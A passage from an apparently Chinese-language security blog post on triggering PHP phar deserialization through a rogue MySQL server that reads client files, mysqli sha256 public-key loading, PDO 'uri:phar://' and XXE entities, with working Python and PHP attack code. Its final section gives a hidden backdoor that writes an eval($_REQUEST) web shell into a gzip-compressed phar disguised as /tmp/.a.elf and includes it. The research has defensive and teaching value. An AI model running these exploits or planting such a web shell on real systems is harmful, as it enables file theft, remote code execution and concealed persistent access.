<span class="title">collect_incoming_data</span>(<span class="params">self, data</span>):</span></span><br><span class="line">            _infoShow(<span class="string">&#x27;Data recved: %r&#x27;</span>, data)</span><br><span class="line">            self.ibuffer.append(data)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">found_terminator</span>(<span class="params">self</span>):</span></span><br><span class="line">            data = <span class="string">b&quot;&quot;</span>.join(self.ibuffer) <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> <span class="string">&quot;&quot;</span>.join(self.ibuffer)</span><br><span class="line">            self.ibuffer = []</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> self.state == self.stateList[<span class="number">0</span>]:  <span class="comment"># LEN</span></span><br><span class="line">                len_bytes = data[<span class="number">0</span>] + <span class="number">256</span> * data[<span class="number">1</span>] + <span class="number">65536</span> * data[<span class="number">2</span>] + <span class="number">1</span> <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> <span class="built_in">ord</span>(</span><br><span class="line">                    data[<span class="number">0</span>]) + <span class="number">256</span> * <span class="built_in">ord</span>(data[<span class="number">1</span>]) + <span class="number">65536</span> * <span class="built_in">ord</span>(data[<span class="number">2</span>]) + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> len_bytes &lt; <span class="number">65536</span>:</span><br><span class="line">                    self.set_terminator(len_bytes)</span><br><span class="line">                    self.state = self.stateList[<span class="number">2</span>]  <span class="comment"># Data</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.state = self.stateList[<span class="number">3</span>]  <span class="comment"># MoreLength</span></span><br><span class="line">            <span class="keyword">elif</span> self.state == self.stateList[<span class="number">3</span>]:  <span class="comment"># MoreLength</span></span><br><span class="line">                <span class="keyword">if</span> (checkVersionPy3() <span class="keyword">and</span> data[<span class="number">0</span>] != <span class="string">b&#x27;\0&#x27;</span>) <span class="keyword">or</span> data[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">                    self.push(<span class="literal">None</span>)</span><br><span class="line">                    self.close_when_done()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.state = self.stateList[<span class="number">2</span>]  <span class="comment"># Data</span></span><br><span class="line">            <span class="keyword">elif</span> self.state == self.stateList[<span class="number">2</span>]:  <span class="comment"># Data</span></span><br><span class="line">                packet = _MysqlPacket.parse(data)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.order != packet.packet_num:</span><br><span class="line">                        <span class="keyword">raise</span> _OutOfOrder()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="comment"># Fix ?</span></span><br><span class="line">                        self.order = packet.packet_num + <span class="number">2</span></span><br><span class="line">                    <span class="keyword">if</span> packet.packet_num == <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">if</span> packet.payload[<span class="number">0</span>] == <span class="string">&#x27;\x03&#x27;</span>:</span><br><span class="line">                            _infoShow(<span class="string">&#x27;Query&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                            self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                            self.state = self.stateList[<span class="number">0</span>]  <span class="comment"># LEN</span></span><br><span class="line">                            self.sub_state = self.stateList[<span class="number">4</span>]  <span class="comment"># File</span></span><br><span class="line">                            self.file = fileName.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">                            <span class="comment"># end</span></span><br><span class="line">                            <span class="keyword">if</span> <span class="built_in">len</span>(fileName) == <span class="number">1</span>:</span><br><span class="line">                                <span class="keyword">global</span> _rouge_mysql_server_read_file_end</span><br><span class="line">                                _rouge_mysql_server_read_file_end = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                            self.push(_MysqlPacket(</span><br><span class="line">                                packet,</span><br><span class="line">                                <span class="string">&#x27;\xFB&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(self.file)</span><br><span class="line">                            ))</span><br><span class="line">                        <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] == <span class="string">&#x27;\x1b&#x27;</span>:</span><br><span class="line">                            _infoShow(<span class="string">&#x27;SelectDB&#x27;</span>)</span><br><span class="line">                            self.push(_MysqlPacket(</span><br><span class="line">                                packet,</span><br><span class="line">                                <span class="string">&#x27;\xfe\x00\x00\x02\x00&#x27;</span></span><br><span class="line">                            ))</span><br><span class="line">                            <span class="keyword">raise</span> _LastPacket()</span><br><span class="line">                        <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">&#x27;\x02&#x27;</span>:</span><br><span class="line">                            self.push(_MysqlPacket(</span><br><span class="line">                                packet, <span class="string">&#x27;\0\0\0\x02\0\0\0&#x27;</span></span><br><span class="line">                            ))</span><br><span class="line">                            <span class="keyword">raise</span> _LastPacket()</span><br><span class="line">                        <span class="keyword">elif</span> packet.payload == <span class="string">&#x27;\x00\x01&#x27;</span>:</span><br><span class="line">                            self.push(<span class="literal">None</span>)</span><br><span class="line">                            self.close_when_done()</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">raise</span> ValueError()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> self.sub_state == self.stateList[<span class="number">4</span>]:  <span class="comment"># File</span></span><br><span class="line">                            _infoShow(<span class="string">&#x27;-- result&#x27;</span>)</span><br><span class="line">                            <span class="comment"># fileContent</span></span><br><span class="line">                            _infoShow(<span class="string">&#x27;Result: %r&#x27;</span>, data)</span><br><span class="line">                            <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">1</span>:</span><br><span class="line">                                self.push(</span><br><span class="line">                                    _MysqlPacket(packet, <span class="string">&#x27;\0\0\0\x02\0\0\0&#x27;</span>)</span><br><span class="line">                                )</span><br><span class="line">                                <span class="keyword">raise</span> _LastPacket()</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                                self.state = self.stateList[<span class="number">0</span>]  <span class="comment"># LEN</span></span><br><span class="line">                                self.order = packet.packet_num + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">global</span> _rouge_mysql_sever_read_file_result</span><br><span class="line">                            _rouge_mysql_sever_read_file_result.update(</span><br><span class="line">                                &#123;self.file: data.encode() <span class="keyword">if</span> <span class="keyword">not</span> checkVersionPy3() <span class="keyword">else</span> data&#125;</span><br><span class="line">                            )</span><br><span class="line"></span><br><span class="line">                            <span class="comment"># test</span></span><br><span class="line">                            <span class="comment"># print(self.file + &quot;:\n&quot; + content.decode() if checkVersionPy3() else content)</span></span><br><span class="line"></span><br><span class="line">                            self.close_when_done()</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">elif</span> self.sub_state == self.stateList[<span class="number">1</span>]:  <span class="comment"># Auth</span></span><br><span class="line">                            self.push(_MysqlPacket(</span><br><span class="line">                                packet, <span class="string">&#x27;\0\0\0\x02\0\0\0&#x27;</span></span><br><span class="line">                            ))</span><br><span class="line">                            <span class="keyword">raise</span> _LastPacket()</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            _infoShow(<span class="string">&#x27;-- else&#x27;</span>)</span><br><span class="line">                            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Unknown packet&#x27;</span>)</span><br><span class="line">                <span class="keyword">except</span> _LastPacket:</span><br><span class="line">                    _infoShow(<span class="string">&#x27;Last packet&#x27;</span>)</span><br><span class="line">                    self.state = self.stateList[<span class="number">0</span>]  <span class="comment"># LEN</span></span><br><span class="line">                    self.sub_state = <span class="literal">None</span></span><br><span class="line">                    self.order = <span class="number">0</span></span><br><span class="line">                    self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                <span class="keyword">except</span> _OutOfOrder:</span><br><span class="line">                    _infoShow(<span class="string">&#x27;Out of order&#x27;</span>)</span><br><span class="line">                    self.push(<span class="literal">None</span>)</span><br><span class="line">                    self.close_when_done()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                _infoShow(<span class="string">&#x27;Unknown state&#x27;</span>)</span><br><span class="line">                self.push(<span class="string">&#x27;None&#x27;</span>)</span><br><span class="line">                self.close_when_done()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">_MysqlListener</span>(<span class="params">dispatcher</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, sock=<span class="literal">None</span></span>):</span></span><br><span class="line">            dispatcher.__init__(self, sock)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> sock:</span><br><span class="line">                self.create_socket(AF_INET, SOCK_STREAM)</span><br><span class="line">                self.set_reuse_addr()</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    self.bind((<span class="string">&#x27;&#x27;</span>, port))</span><br><span class="line">                <span class="keyword">except</span> error:</span><br><span class="line">                    exit()</span><br><span class="line"></span><br><span class="line">                self.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span>(<span class="params">self</span>):</span></span><br><span class="line">            pair = self.accept()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> pair <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                _infoShow(<span class="string">&#x27;Conn from: %r&#x27;</span>, pair[<span class="number">1</span>])</span><br><span class="line">                _HttpRequestHandler(pair)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> _rouge_mysql_server_read_file_end:</span><br><span class="line">                    self.close()</span><br><span class="line"></span><br><span class="line">    _MysqlListener()</span><br><span class="line">    _asyLoop()</span><br><span class="line">    <span class="keyword">return</span> _rouge_mysql_sever_read_file_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> name, content <span class="keyword">in</span> rouge_mysql_sever_read_file(fileName=[<span class="string">&quot;phar://F:/phpEnv/web/php74/p.phar/a&quot;</span>], port=<span class="number">3307</span>,showInfo=<span class="literal">True</span>).items():</span><br><span class="line">        <span class="built_in">print</span>(name + <span class="string">&quot;:\n&quot;</span> + content.decode())</span><br></pre></td></tr></table></figure>
<p>然后重新更改下触发脚本👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			touch(<span class="string">&quot;F:/phpEnv/web/php74/e/wakeup&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			touch(<span class="string">&quot;F:/phpEnv/web/php74/e/destruct&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$m</span> = mysqli_init();</span><br><span class="line">	mysqli_real_connect(<span class="variable">$m</span>,<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;123&quot;</span>,<span class="string">&quot;123&quot;</span>,<span class="string">&quot;cx&quot;</span>,<span class="number">3307</span>);</span><br><span class="line">	mysqli_query(<span class="variable">$m</span>,<span class="string">&quot;select version()&quot;</span>);</span><br><span class="line">	<span class="variable">$m</span>-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201270016608.png" alt="image-20220127001645039"></p>
<p>可以看到成功触发了 <code>反序列化</code> 。</p>
<p>另外，其实 <code>mysqli.allow_local_infile</code> 这玩意在 <code>php7.2.16 ~ php7.3.3</code> 默认为 <code>1</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201270014794.png" alt="image-20220127001442726"></p>
<p>说不定又是一个 <code>ctf</code> 的出题思路呢(笑)。</p>
<h4 id="sha256-auth">- sha256 auth -</h4>
<p>这个印象里好像在那道题见过的，具体原因是当 <code>mysql</code> 服务要求使用 <code>sha256</code> 认证模式时，客户端会加载 <code>rsa公钥</code> 文件，这个加载是可以使用 <code>phar</code> 协议对文件进行解析的。</p>
<p>来看 <code>mysqlnd_auth.c</code> 文件的 <code>mysqlnd_sha256_get_rsa_key</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271107033.png" alt="image-20220127110748840"></p>
<p>这里是将文件名作为参数调用了 <code>php_stream_open_wrapper</code> 函数，因此可以解析 <code>phar</code> 协议。而这个 <code>mysqlnd_sha256_get_rsa_key</code> 函数又来自 <code>mysqlnd_sha256_auth_get_auth_data</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271109719.png" alt="image-20220127110936587"></p>
<p>那么只要将远程服务器设置成 <code>sha256</code> 认证模式，再将其加载的 <code>rsa公钥</code> 文件名更改成 <code>phar</code> 协议内容，在进行连接的时候就有可能触发 <code>phar</code> 。</p>
<p>不妨做一个演示，首先更改 <code>my.ini</code> 配置👇</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">default-authentication-plugin</span>=sha256_password </span><br><span class="line"><span class="attr">ssl-ca</span>=<span class="string">&quot;F:/phpEnv/server/mysql/mysql-5.6/ca/ca-cert.pem&quot;</span></span><br><span class="line"><span class="attr">ssl-cert</span>=<span class="string">&quot;F:/phpEnv/server/mysql/mysql-5.6/ca/server-cert.pem&quot;</span></span><br><span class="line"><span class="attr">ssl-key</span>=<span class="string">&quot;F:/phpEnv/server/mysql/mysql-5.6/ca/server-key.pem&quot;</span></span><br></pre></td></tr></table></figure>
<p>确保 <code>mysql</code> 服务器是需要密钥通讯的👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271113281.png" alt="image-20220127111355219"></p>
<p>这样就可以了，毕竟只是这个触发 <code>phar</code> 方式是让客户端在加载 <code>rsa公钥</code> 时候就触发的，没必要真登录上，也就没必要新建一个 <code>sha256</code> 密码的 <code>mysql</code> 用户。然后是 <code>phar</code> 代码👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;p.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a&#x27;</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>以及触发代码👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			touch(<span class="string">&quot;F:/phpEnv/web/php74/e/wakeup_auth&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			touch(<span class="string">&quot;F:/phpEnv/web/php74/e/destruct_auth&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$m</span> = mysqli_init();</span><br><span class="line">	mysqli_options(<span class="variable">$m</span>,MYSQLI_SERVER_PUBLIC_KEY,<span class="string">&quot;phar://F:/phpEnv/web/php74/p.phar/a&quot;</span>);</span><br><span class="line">	mysqli_real_connect(<span class="variable">$m</span>,<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;123&quot;</span>,<span class="string">&quot;123&quot;</span>); <span class="comment"># 没必要真的登录</span></span><br><span class="line">	mysqli_query(<span class="variable">$m</span>,<span class="string">&quot;select version()&quot;</span>);</span><br><span class="line">	<span class="variable">$m</span>-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271122582.png" alt="image-20220127112208452"></p>
<p>可以发现是成功触发了。</p>
<p>另外，由于 <code>mysqlnd.sha256_server_public_key</code> 的可更改范围为 <code>PHP_INI_PERDIR</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271123212.png" alt="image-20220127112341166"></p>
<p>而 <code>PHP_INI_PERDIR</code> 是可以在 <code>.htaccess</code> 里设置👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271125080.png" alt="image-20220127112543044"></p>
<p>由此可以有机会通过上传 <code>.htaccess</code> 文件来结合 <code>mysql</code> 的连接进行 <code>phar</code> 的触发，比如下面的例子👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271204499.png" alt="image-20220127120402380"></p>
<p>可见确实是可以成功触发。</p>
<h4 id="pdo">- pdo -</h4>
<p>这玩意是用来创建一个表示数据库连接的 <code>pdo</code> 实例，直接来看 <code>pdo_dbh.c</code> 文件的 <code>dsn_from_uri</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271216867.png" alt="image-20220127121633786"></p>
<p>存在对 <code>php_stream_open_wrapper</code> 函数的调用，而传入的 <code>*uri</code> 参数来自 <code>pdo</code> 的 <code>__construct</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271218240.png" alt="image-20220127121826098"></p>
<p>这里会将形如 <code>uri:[内容]</code> 中的内容部分作为参数传入 <code>dsn_from_uri</code> 函数，因此就可以通过构造形如 <code>uri:phar://</code> 的形式进行 <code>反序列化</code> 。那么有关 <code>phar</code> 的代码👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;p.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a&#x27;</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>触发代码👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[wakeup]&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[destruct]&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">new</span> PDO(<span class="string">&quot;uri:phar://F:/phpEnv/web/php74/p.phar/a&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271224445.png" alt="image-20220127122448351"></p>
<p>可见是触发了 <code>__wakeup</code> ，但由于提前报错导致无法执行到 <code>__destruct</code> 这一步。这里只需要让这个 <code>pdo</code> 真的能够连接上 <code>mysql</code> 即可👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;p.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a&#x27;</span>]=<span class="string">&#x27;mysql:host=127.0.0.1;user=root;password=root&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>再次尝试👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271233473.png" alt="image-20220127123358383"></p>
<p>可见是成功了。</p>
<h3 id="XXE">- XXE -</h3>
<p>使用 <code>xxe</code> 对 <code>phar</code> 进行触发应该是再平常不过了吧，主要原因还是先来看 <code>libxml.c</code> 的 <code>php_libxml_streams_IO_open_wrapper</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271239097.png" alt="image-20220127123936953"></p>
<p>大致意思是当 <code>xml</code> 非 <code>file</code> 协议去读文件时会通过 <code>php_stream_locate_url_wrapper</code> 函数找到对应协议并调用了 <code>url_stat</code> 的 <code>流包装器</code> 方法。而在上面的分析已经知道当调用 <code>phar</code> 的 <code>流包装器</code> 的 <code>url_stat</code> 方法就有可能到达对 <code>phar</code> 的解析，从而进行 <code>反序列化</code> ，因此关键点应该是 <code>wrapper-&gt;wops-&gt;url_stat()</code> 的调用。当然，这个 <code>php_stream_locate_url_wrapper</code> 函数中又有 <code>wrapper-&gt;wops-&gt;stream_opener()</code> 的调用，也有可能是通过 <code>phar_wrapper_open_url</code> 方法最终达到 <code>反序列化</code> ，总之能够反序列化就对了(在甚至后面还有对 <code>php_stream_open_wrapper_ex</code> 函数的调用，反正就是层层都有可能进行 <code>反序列化</code>)。</p>
<p>那么不妨写个简单例子，先是 <code>phar</code> 代码👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;p.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a&#x27;</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>然后是触发代码👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[wakeup]&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[destruct]&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="variable">$x</span>=<span class="string">&lt;&lt;&lt;X</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="string">&lt;!ENTITY xxe SYSTEM &quot;phar:///phpEnv/web/php74/p.phar/a&quot; &gt;]&gt;        </span></span><br><span class="line"><span class="string">&lt;a&gt;&amp;xxe;&lt;/a&gt;</span></span><br><span class="line"><span class="string">X</span>;</span><br><span class="line"><span class="keyword">new</span> SimpleXMLElement(<span class="variable">$x</span>,<span class="number">2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中 <code>phar:///phpEnv/web/php74/p.phar/a</code> 中的 <code>///</code> 是获取当前盘符根路径，像是 <code>phar://F:/phpEnv/web/php74/p.phar/a</code> 会报错，但 <code>php://filter//resource=phar://F:/phpEnv/web/php74/p.phar/a</code> 可以，<code>phar://./p.phar/a</code> 可以，<code>phar:///var/www/html/p.phar/a</code> 也可以。</p>
<p>得到结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271308990.png" alt=""></p>
<p>可见是成功了。</p>
<h2 id="后门">- 后门 -</h2>
<p>主要思想还是源自 <code>phar.readonly</code> 这个配置值是 <code>PHP_INI_ALL</code> 的👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271330459.png" alt="image-20220127133015404"></p>
<p>也就可以通过 <code>.user.ini</code> 、 <code>.htaccess</code> 以及 <code>ini_set</code> 方式改变，那么就可以通过改变这个值在目标服务器上写 <code>phar</code> 内容。而由于 <code>phar</code> 为归档文件，不仅可以藏 <code>敏感数据</code> ，又可以触发 <code>反序列化</code> ，且 <code>phar</code> 的格式支持多种多样， <code>后门</code> 的写法也就千变万化。</p>
<p>比如可以举其中两个例子。</p>
<h3 id="藏数据">- 藏数据 -</h3>
<p>这个是依靠 <code>phar</code> 文件的格式的多样性来进行的，比如以下代码👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">&#x27;/tmp/.a.elf&#x27;</span>))&#123;</span><br><span class="line">    chdir(<span class="string">&#x27;/tmp&#x27;</span>);</span><br><span class="line">	ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="variable">$p</span>=<span class="keyword">new</span> Phar(<span class="string">&quot;.a.phar&quot;</span>);</span><br><span class="line">	<span class="variable">$p</span>[<span class="string">&#x27;a&#x27;</span>]=<span class="string">&#x27;&lt;?php eval($_REQUEST[7]);?&gt;&#x27;</span>;</span><br><span class="line">	<span class="variable">$p</span>-&gt;compress(Phar::GZ);</span><br><span class="line">    unlink(<span class="string">&#x27;.a.phar&#x27;</span>);</span><br><span class="line">    rename(<span class="string">&#x27;.a.phar.gz&#x27;</span>,<span class="string">&#x27;.a.elf&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span> <span class="string">&#x27;phar:///tmp/.a.elf/a&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>将 <code>敏感数据</code> 打包成了 <code>gz</code> 文件，这样除非解压，直接查看只能是一串乱码👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271346150.png" alt="image-20220127134624014"></p>
<p>当然，压缩成 <code>bz2</code> 也是可以的。</p>
<h3 id="自身反序列化">- 自身反序列化 -</h3>
